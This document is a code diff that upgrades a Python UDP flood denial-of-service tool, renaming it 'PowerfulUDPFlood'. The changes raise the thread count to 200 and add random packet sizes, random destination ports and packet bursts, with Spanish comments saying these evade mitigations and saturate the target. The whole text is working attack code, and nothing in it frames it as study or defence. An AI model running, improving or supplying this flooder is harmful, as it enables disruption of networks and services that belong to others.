@@ -2,17 +2,18 @@ import socket
 import threading
 import os
 import time
+import random
 
-class UDPPPS:
-    def __init__(self, ip, port, threads, stop_event=None):
+class PowerfulUDPFlood:
+    def __init__(self, ip, port, threads, duration, stop_event=None):
         self.ip = ip
         self.port = port
-        self.packet_size = 1024
         self.threads = threads
+        self.duration = duration
         self.stop_event = stop_event
         self.on = False
 
-    def flood(self, duration):
+    def flood(self):
         self.on = True
         threads = []
         for _ in range(self.threads):
@@ -20,7 +21,7 @@ class UDPPPS:
             t.start()
             threads.append(t)
 
-        end_time = time.time() + duration
+        end_time = time.time() + self.duration
         try:
             while time.time() < end_time and self.on:
                 if self.stop_event and self.stop_event.is_set():
@@ -35,14 +36,26 @@ class UDPPPS:
         while self.on:
             if self.stop_event and self.stop_event.is_set():
                 break
+
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                data = os.urandom(self.packet_size)
-                s.sendto(data, (self.ip, self.port))
-                s.close()
+                # Paquete de tamaño aleatorio para evadir mitigaciones
+                packet_size = random.choice([1024, 2048, 4096, 8192, 16384])
+                data = os.urandom(packet_size)
+                
+                # Puerto aleatorio en rango (puedes ajustar el rango)
+                dest_port = self.port
+                if random.random() > 0.7:
+                    dest_port = random.randint(1, 65535)
+
+                # Burst: varios paquetes seguidos para saturar
+                burst_count = random.randint(10, 100)
+                for _ in range(burst_count):
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    s.sendto(data, (self.ip, dest_port))
+                    s.close()
             except Exception:
                 pass
 
-def run(ip, port, duration, stop_event):
-    attacker = UDPPPS(ip, port, threads=50, stop_event=stop_event)
-    attacker.flood(duration)
+def run(ip, port, duration, stop_event=None):
+    attacker = PowerfulUDPFlood(ip, port, threads=200, duration=duration, stop_event=stop_event)
+    attacker.flood()
